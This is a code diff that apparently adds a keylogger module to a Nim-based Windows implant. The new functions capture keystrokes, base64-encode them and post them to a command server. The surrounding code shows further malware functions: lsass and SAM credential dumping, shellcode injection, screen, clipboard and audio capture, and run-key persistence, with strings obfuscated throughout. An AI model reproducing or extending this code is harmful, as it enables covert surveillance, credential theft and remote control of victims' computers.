@@ -1,7 +1,7 @@
 # Internal imports
 import ../config
 import ../common
-import utils/[audio, clipboard, clr, helpers, memops, misc, screenshot]
+import utils/[audio, clipboard, clr, helpers, memops, misc, screenshot, keylogger]
 # Internal imports
 import std/[tables, nativesockets, json]
 import winim/[lean, com]
@@ -27,6 +27,9 @@ proc checksec(): bool
 proc wrap_get_clipboard(): bool
 proc wrap_get_screenshot(): bool
 proc wrap_record_audio(record_time: int): bool
+proc wrap_keylog_start(): bool
+proc wrap_keylog_dump(): bool
+proc wrap_keylog_stop(): bool
 proc dump_lsass(dump_method: string): bool
 proc dump_sam(): bool
 proc wrap_inject_shellc(shellc_base64: string, pid: int): bool
@@ -226,6 +229,31 @@ proc wrap_record_audio(record_time: int): bool =
     is_success = post_data(client, protectString("audio") , $data)
 
     return is_success
+
+
+proc wrap_keylog_start(): bool =
+    keylog_start()
+    var data = {
+        protectString("status"): protectString("keylogger started in a new thread")
+    }.toOrderedTable()
+    return post_data(client, protectString("keylog-start") , $data)
+
+
+proc wrap_keylog_dump(): bool = 
+    var klout = keylog_dump()
+    var data = {
+        protectString("keystrokes_base64"): encode_64(klout, is_bin=true)
+    }.toOrderedTable()
+    return post_data(client, protectString("keylog-dump") , $data)
+
+
+proc wrap_keylog_stop(): bool = 
+    var klout = keylog_stop()
+    var data = {
+        protectString("status"): protectString("keylogger stopped"),
+        protectString("keystrokes_base64"): encode_64(klout, is_bin=true)
+    }.toOrderedTable()
+    return post_data(client, protectString("keylog-stop") , $data)
 
 
 proc dump_lsass(dump_method: string): bool = 
@@ -435,7 +463,6 @@ proc msgbox(title: string, text: string) {.gcsafe.} =
     MessageBox(0, text, title, 0)
 
 
-
 proc speak(text: string): bool =
     var is_success: bool
     
@@ -550,6 +577,14 @@ proc windows_parse_command*(command: JsonNode): bool =
             is_success = wrap_inject_shellc(command[protectString("shellc_base64")].getStr(), command["pid"].getInt())
         of protectString("assembly"):
             is_success = wrap_execute_assembly(command["assembly_base64"].getStr(), command["assembly_args"].getStr())
+        of protectString("keylog"):
+            var keylog_action = command[protectString("action")].getStr()
+            if keylog_action == "start":
+                is_success = wrap_keylog_start()
+            elif keylog_action == "dump":
+                is_success = wrap_keylog_dump()
+            if keylog_action == "stop":
+                is_success = wrap_keylog_stop()                                
         of protectString("patch"):
             is_success = wrap_patch_func(command[protectString("patch_func")].getStr())
         of protectString("persist-run"):
